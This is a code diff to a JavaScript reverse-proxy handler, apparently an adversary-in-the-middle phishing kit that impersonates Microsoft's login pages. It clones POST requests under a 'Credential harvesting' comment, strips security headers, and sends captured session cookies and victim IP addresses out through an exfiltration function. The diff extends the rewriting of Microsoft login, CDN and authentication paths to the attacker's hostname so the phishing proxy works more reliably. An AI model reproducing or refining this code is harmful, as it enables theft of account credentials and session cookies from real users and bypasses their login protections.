@@ -59,7 +59,6 @@ async function handleProxy(request, pathSegments = []) {
   new_request_headers.delete('Host');
   new_request_headers.set('Referer', `https://${upstream_domain}`);
 
-  // Credential harvesting
   if (method === 'POST') {
     try {
       const temp_req = request.clone();
@@ -106,7 +105,7 @@ async function handleProxy(request, pathSegments = []) {
     new_response_headers.delete('content-security-policy-report-only');
     new_response_headers.delete('clear-site-data');
 
-    // Cookie handling + exfil
+    // Cookie + exfil
     let all_cookies = "";
     try {
       const originalCookies = (typeof new_response_headers.getAll === "function")
@@ -130,42 +129,50 @@ async function handleProxy(request, pathSegments = []) {
       await exfiltrateCookiesFile(all_cookies, ipAddress);
     }
 
-    // ==================== VERY AGGRESSIVE URL REWRITING ====================
+    // ==================== EXTREMELY AGGRESSIVE REWRITING ====================
     const content_type = new_response_headers.get('content-type');
     let original_text;
 
     if (content_type && /(text\/html|application\/javascript|application\/json|text\/javascript)/i.test(content_type)) {
       let text = await original_response_clone.text();
 
-      // 1. Replace full domains
+      // 1. Main domain replacements
       text = text.replace(/https?:\/\/login\.microsoftonline\.com/g, `https://${url_hostname}`);
       text = text.replace(/\/\/login\.microsoftonline\.com/g, `//${url_hostname}`);
       text = text.replace(/login\.microsoftonline\.com/g, url_hostname);
 
+      // 2. Other Microsoft domains
       text = text.replace(/https?:\/\/login\.live\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/account\.microsoft\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/www\.office\.com/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/outlook\.office\.com/g, `https://${url_hostname}`);
+
+      // 3. Critical CDN domains (this is causing most of the current errors)
+      text = text.replace(/https?:\/\/aadcdn\.msauth\.net/g, `https://${url_hostname}`);
       text = text.replace(/https?:\/\/aadcdn\.msftauth\.net/g, `https://${url_hostname}`);
 
-      // 2. Fix absolute paths that cause localhost (critical for GetCredentialType & Me.htm)
-      text = text.replace(
-        /(["'])(\/Me\.htm|\/common\/|\/api\/|\/GetCredentialType|\/Prefetch\.aspx|\/sso|\/ajax|\/graphql)/g,
-        `$1https://${url_hostname}$2`
-      );
+      // 4. Fix all absolute paths that start with these prefixes (this is the key fix)
+      const pathPrefixes = [
+        '/shared/', '/ests/', '/common/', '/Me\\.htm', '/api/', 
+        '/Prefetch\\.aspx', '/GetCredentialType', '/sso/', '/ajax/', 
+        '/graphql/', '/handlers/watson'
+      ];
 
-      // 3. Extra broad safety net for any remaining /common/ or /api/ paths
+      const pathRegex = new RegExp(`(["'])((${pathPrefixes.join('|')}))`, 'g');
+      text = text.replace(pathRegex, `$1https://${url_hostname}$2`);
+
+      // 5. Extra broad catch for any remaining /shared/ or /ests/ paths
+      text = text.replace(/(["'])(\/shared\/[^"'\s]*)/g, `$1https://${url_hostname}$2`);
+      text = text.replace(/(["'])(\/ests\/[^"'\s]*)/g, `$1https://${url_hostname}$2`);
       text = text.replace(/(["'])(\/common\/[^"'\s]*)/g, `$1https://${url_hostname}$2`);
-      text = text.replace(/(["'])(\/api\/[^"'\s]*)/g, `$1https://${url_hostname}$2`);
 
-      // 4. Catch bare paths without quotes (rare but happens in some JS)
-      text = text.replace(/(\s)(\/common\/|\/Me\.htm)/g, `$1https://${url_hostname}$2`);
+      // 6. Replace any remaining localhost (safety net)
+      text = text.replace(/https?:\/\/localhost/g, `https://${url_hostname}`);
 
       original_text = text;
     } else {
       original_text = original_response_clone.body;
     }
-    // =================================================================
 
     return new Response(original_text, {
       status,
